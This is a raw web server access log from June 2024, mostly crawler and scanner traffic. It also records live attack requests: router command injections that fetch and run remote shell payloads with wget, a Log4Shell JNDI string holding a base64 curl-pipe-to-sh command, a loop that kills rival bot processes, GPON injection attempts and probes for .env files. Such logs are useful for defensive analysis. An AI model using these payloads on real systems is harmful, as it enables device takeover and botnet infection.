185.191.127.212 - - [19/Jun/2024:02:41:40 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22dvrLocker%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.127.212 - - [19/Jun/2024:02:41:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [19/Jun/2024:02:54:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:03:14:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.171.3 - - [19/Jun/2024:03:21:01 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
85.208.96.197 - - [19/Jun/2024:03:21:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
149.50.103.48 - - [19/Jun/2024:03:33:49 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
141.98.11.82 - - [19/Jun/2024:03:35:32 +0000] "GET / HTTP/1.1" 301 166 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//141.98.11.82:2411/TomcatBypass/Command/Base64/Y3VybCBodHRwOi8vMTg1LjE3Mi4xMjguOTMvbGcgfHNoIHx8IHdnZXQgLU8tIGh0dHA6Ly8xODUuMTcyLjEyOC45My9sZyB8IHNo}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//141.98.11.82:2411/TomcatBypass/Command/Base64/Y3VybCBodHRwOi8vMTg1LjE3Mi4xMjguOTMvbGcgfHNoIHx8IHdnZXQgLU8tIGh0dHA6Ly8xODUuMTcyLjEyOC45My9sZyB8IHNo}')"
92.249.48.222 - - [19/Jun/2024:15:56:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:16:12:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [19/Jun/2024:16:15:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.142.125.198 - - [19/Jun/2024:16:29:50 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
162.142.125.198 - - [19/Jun/2024:16:30:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.198 - - [19/Jun/2024:16:30:06 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
92.249.48.222 - - [19/Jun/2024:16:33:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [19/Jun/2024:16:40:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
123.129.130.219 - - [19/Jun/2024:16:45:15 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 166 "-" "Hello, World"
123.129.130.219 - - [19/Jun/2024:16:45:16 +0000] "0;sh+/tmp/gpon80&ipv=0" 400 154 "-" "-"
194.169.175.208 - - [19/Jun/2024:16:50:05 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
194.169.175.208 - - [19/Jun/2024:16:50:07 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
92.249.48.222 - - [19/Jun/2024:16:51:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [19/Jun/2024:17:06:51 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
172.206.141.237 - - [19/Jun/2024:17:09:24 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.199 - - [19/Jun/2024:17:13:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.199 - - [19/Jun/2024:17:13:14 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
92.249.48.222 - - [19/Jun/2024:17:15:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
66.249.79.76 - - [19/Jun/2024:17:16:45 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.76 - - [19/Jun/2024:17:17:02 +0000] "GET /ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
92.249.48.222 - - [19/Jun/2024:17:32:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
178.215.236.28 - - [19/Jun/2024:17:34:34 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
178.215.236.28 - - [19/Jun/2024:17:34:36 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
147.28.129.15 - - [19/Jun/2024:17:38:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
46.19.143.66 - - [19/Jun/2024:17:56:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:17:57:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [19/Jun/2024:17:58:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [19/Jun/2024:18:20:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [19/Jun/2024:18:20:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [19/Jun/2024:18:22:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.244.36.206 - - [19/Jun/2024:18:31:04 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.191.127.212 - - [19/Jun/2024:18:33:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [19/Jun/2024:18:37:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
93.123.39.215 - - [19/Jun/2024:18:39:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.244.36.206 - - [19/Jun/2024:18:51:45 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [19/Jun/2024:18:53:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.223.31.96 - - [19/Jun/2024:19:00:55 +0000] "GET /wp-login.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
46.19.143.66 - - [19/Jun/2024:19:09:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:19:15:29 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
193.177.182.107 - - [19/Jun/2024:19:30:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
92.249.48.222 - - [19/Jun/2024:19:33:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
162.214.127.74 - - [19/Jun/2024:19:41:34 +0000] "GET /wp-login.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0"
45.128.232.194 - - [19/Jun/2024:19:44:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.194 - - [19/Jun/2024:19:44:31 +0000] "" 400 0 "-" "-"
92.249.48.222 - - [19/Jun/2024:19:54:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [19/Jun/2024:19:56:07 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
223.113.128.217 - - [19/Jun/2024:20:14:21 +0000] "GET / HTTP/1.1" 301 166 "-" "curl/7.29.0"
223.113.128.217 - - [19/Jun/2024:20:14:23 +0000] "\x16\x03\x01\x01\x06\x01\x00\x01\x02\x03\x03\xB5.\xF3\xE6q\x04\xE5a@\xBE\xA1R\xCF\xAAf\x8E\xBBO`\xEE\x9Bg_$B\x12\x05\x02\xF1\xD5[Y \x1DyMj\xF1S\xCE\x14\x9E\xAE\x84d\x05\x1A\xB6\x09\x04\xBF\xE8\xD1N\xA3\x16\xD7\x0F\xC6%\x80\xC9>\x9E\xD0\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
223.113.128.217 - - [19/Jun/2024:20:14:24 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x09G\xB2\xCD3I\x07\x03p\x88" 400 154 "-" "-"
223.113.128.217 - - [19/Jun/2024:20:14:25 +0000] "t3 12.1.2" 400 154 "-" "-"
185.244.36.206 - - [19/Jun/2024:20:15:38 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
24.152.49.142 - - [19/Jun/2024:20:17:26 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 301 166 "-" "Hello, World"
24.152.49.142 - - [19/Jun/2024:20:17:26 +0000] "sh+/tmp/gpon80&ipv=0" 400 154 "-" "-"
92.249.48.222 - - [19/Jun/2024:20:20:48 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.19.143.66 - - [19/Jun/2024:20:21:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.142.236.40 - - [19/Jun/2024:20:26:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.40 - - [19/Jun/2024:20:26:23 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "-"
185.142.236.40 - - [19/Jun/2024:20:26:24 +0000] "GET /sitemap.xml HTTP/1.1" 301 166 "-" "-"
185.142.236.40 - - [19/Jun/2024:20:26:25 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 166 "-" "-"
185.142.236.40 - - [19/Jun/2024:20:26:27 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
92.249.48.222 - - [19/Jun/2024:20:38:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:20:53:23 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
124.156.193.7 - - [19/Jun/2024:20:56:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.249.48.222 - - [19/Jun/2024:21:18:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
159.203.86.145 - - [19/Jun/2024:21:28:04 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
185.191.127.212 - - [19/Jun/2024:21:29:38 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
35.203.211.112 - - [19/Jun/2024:21:34:30 +0000] "GET / HTTP/1.1" 301 166 "http://180.233.121.154:1081/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
159.203.86.145 - - [19/Jun/2024:21:35:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
185.191.126.213 - - [19/Jun/2024:21:36:29 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
46.19.143.66 - - [19/Jun/2024:21:37:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:21:39:06 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:21:53:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
106.75.64.247 - - [19/Jun/2024:21:59:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 9_2_2; Win64; x64) AppleWebKit/588.52 (KHTML, like Gecko) Chrome/88.0.2559 Safari/537.36"
106.75.64.247 - - [19/Jun/2024:21:59:26 +0000] "\x16\x03\x01\x01\x10\x01\x00\x01\x0C\x03\x03{\xBC\x04vh\x02j\xE2\xEB\xD8\x8E\x00\xA8\xF2s\x03_\x93[\x09\x13\xEEGOZ01\x81\x8F$^\x03 4i\xD4p\xAF\xC7\xCDB\xE4C\xCB\xA7\xC6\x14\x81\xF1\xCD\xDE\xB7k\x08Rf\xEE\xB4PS\x18S\xF3V\x9A\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
92.249.48.222 - - [19/Jun/2024:22:20:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [19/Jun/2024:22:31:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [19/Jun/2024:22:31:58 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
43.163.8.36 - - [19/Jun/2024:22:32:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.224.128.43 - - [19/Jun/2024:22:39:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
206.168.34.201 - - [19/Jun/2024:22:40:02 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
206.168.34.201 - - [19/Jun/2024:22:40:16 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
17.241.227.185 - - [19/Jun/2024:22:42:27 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
17.241.227.185 - - [19/Jun/2024:22:42:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
46.19.143.66 - - [19/Jun/2024:22:49:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.244.36.206 - - [19/Jun/2024:22:53:13 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
45.148.10.174 - - [19/Jun/2024:22:53:19 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [19/Jun/2024:22:53:20 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
43.159.141.180 - - [19/Jun/2024:22:57:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
168.76.20.229 - - [19/Jun/2024:22:59:16 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
168.76.20.229 - - [19/Jun/2024:22:59:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [19/Jun/2024:22:59:18 +0000] "GET /assets/img/favicon/another/favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [19/Jun/2024:22:59:18 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [19/Jun/2024:22:59:18 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.156.130.4 - - [19/Jun/2024:23:03:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
92.249.48.222 - - [19/Jun/2024:23:04:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
162.216.149.5 - - [19/Jun/2024:23:05:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.222 - - [19/Jun/2024:23:14:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [19/Jun/2024:23:26:08 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.126.213 - - [19/Jun/2024:23:28:35 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [19/Jun/2024:23:33:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [19/Jun/2024:23:40:41 +0000] "GET / HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [19/Jun/2024:23:51:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
192.185.176.156 - - [19/Jun/2024:23:58:07 +0000] "HEAD / HTTP/1.1" 301 0 "-" "-"
46.19.143.66 - - [20/Jun/2024:00:03:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.79 - - [20/Jun/2024:00:03:28 +0000] "CONNECT google.com:443 HTTP/1.1" 400 154 "-" "-"
92.249.48.222 - - [20/Jun/2024:00:15:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:00:31:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [20/Jun/2024:00:39:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [20/Jun/2024:00:59:26 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
45.148.10.174 - - [20/Jun/2024:01:11:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
45.148.10.174 - - [20/Jun/2024:01:11:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
46.19.143.66 - - [20/Jun/2024:01:17:48 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [20/Jun/2024:01:19:28 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
157.55.39.225 - - [20/Jun/2024:01:40:47 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
207.46.13.102 - - [20/Jun/2024:01:40:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:36 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
118.123.105.86 - - [20/Jun/2024:01:49:36 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:37 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:38 +0000] "GET /favicon.ico/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:38 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:38 +0000] "GET /robots.txt/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:39 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
118.123.105.86 - - [20/Jun/2024:01:49:39 +0000] "GET /.well-known/security.txt/ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
92.249.48.222 - - [20/Jun/2024:02:00:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [20/Jun/2024:02:04:05 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.222 - - [20/Jun/2024:02:11:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
66.249.75.106 - - [20/Jun/2024:02:13:44 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.75.105 - - [20/Jun/2024:02:13:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.175 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
